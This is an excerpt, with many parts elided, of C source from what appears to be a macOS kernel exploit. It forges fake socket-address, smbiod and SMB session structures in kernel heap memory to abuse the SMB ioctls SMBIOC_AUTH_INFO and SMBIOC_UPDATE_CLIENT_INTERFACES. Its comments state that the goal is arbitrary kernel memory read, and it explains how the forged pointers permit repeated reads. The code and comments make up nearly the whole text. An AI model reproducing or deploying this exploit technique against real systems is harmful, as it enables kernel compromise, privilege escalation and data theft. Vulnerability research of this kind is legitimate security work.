...
///
/// The ioctl command `SMBIOC_AUTH_INFO` is used for reading the authentication info used
/// during SMB session setup. The authentication info is stored in memory pointed by
/// `iod->iod_gss.gss_cpn` and `iod->iod_gss.gss_spn`. Their lengths are stored in
/// `iod->iod_gss.gss_cpn_len` and `iod->iod_gss.gss_spn_len` respectively, where `iod` is of
/// type `struct smbiod`. If we can get write access to any of these pointers and their lengths,
/// we can achieve arbitary kernel memory read.
///
...
struct kmem_read_session {
    struct xpl_kheap_alloc_entry sock_addr_alloc;
    struct xpl_kheap_alloc_entry sock_addr_entry_alloc;
    struct xpl_kheap_alloc_entry iod_alloc;
    struct xpl_kheap_alloc_entry session_alloc;
...
/// will be set to the address of allocated fake socket address, where `client_nic_info_list` equals
/// `fake_session->session_interface_table.client_nic_info_list`
void kmem_read_session_build_sock_addr(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    ...
    xpl_log_debug("allocated fake_sock_addr at: %p", (void*)fake_sock_addr_addr);
}
...
void kmem_read_session_build_sock_addr_entry(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    xpl_assert(session->sock_addr_addr != 0);
    xpl_assert_cond(session->sock_addr_entry_addr, ==, 0);
    ...
    xpl_log_debug("allocated fake_sock_addr_entry at: %p", (void*)fake_sock_addr_entry_addr);
}
...
/// the `struct smbiod` has size 704 but we can only allocate upto 256 bytes using `xpl_kheap_alloc`.
...
/// command from returning EINVAL without triggering a panic.
void kmem_read_session_build_iod(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    xpl_assert(session->sock_addr_entry_addr != 0);
    xpl_assert_cond(session->iod_addr, ==, 0);
    ...
    *((uintptr_t*)((char*)&fake_iod + fake_iod_start - 8)) = 0xabcdef1234567890;
    ...
    /// The value of pointer `fake_session->session_interface_table.client_nic_info_list.tqh_first`
    /// is set to address of `fake_iod->iod_gss.gss_spn`. This is done so that the value of
    /// `fake_iod->iod_gss.gss_cpn` and `fake_iod->iod_gss.gss_cpn_len` can be changed
    /// using  `SMBIOC_UPDATE_CLIENT_INTERFACES` ioctl command. This allows us to
    /// perform read from different kernel memory locations without having to construct a
    /// fake iod for each of those reads
    ...
    struct xpl_kheap_alloc_entry fake_iod_alloc = xpl_kheap_alloc(smb_addr, 255, AF_INET, (char*)&fake_iod + fake_iod_start, 255 - 8, 8);
    ...
    xpl_log_debug("allocated fake_iod at: %p", (void*)fake_iod_addr);
    xpl_log_debug("memory for fake_iod allocated at: %p", (void*)fake_iod_alloc.address);
    xpl_log_debug("using fake_nic_entry addr: %p", (void*)session->nic_entry_addr);
}
...
void kmem_read_session_build_session(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    ...
    xpl_assert(session->nic_entry_addr != 0);
    xpl_assert_cond(session->session_addr, ==, 0);
    ...
    *((uint64_t*)(kmem_read_session + TYPE_SMB_SESSION_MEM_IOD_TAILQ_HEAD_OFFSET - base)) = session->iod_addr;
    ...
    xpl_log_debug("allocated kmem_read_session at: %p", (void*)kmem_read_session_addr);
    xpl_log_debug("memory for kmem_read_session allocated at: %p", (void*)kmem_read_session_alloc.address);
}
...
uintptr_t kmem_read_session_get_addr(kmem_read_session_t session) {
    xpl_assert(session->session_addr != 0);
...
void kmem_read_session_destroy(kmem_read_session_t* session_p) {
    ...
    xpl_allocator_prpw_destroy(&session->sock_addr_alloc.element_allocator);
    xpl_allocator_prpw_destroy(&session->sock_addr_entry_alloc.element_allocator);
    xpl_allocator_prpw_destroy(&session->iod_alloc.element_allocator);
    xpl_allocator_prpw_destroy(&session->session_alloc.element_allocator);
    free(session);
    *session_p = NULL;
}
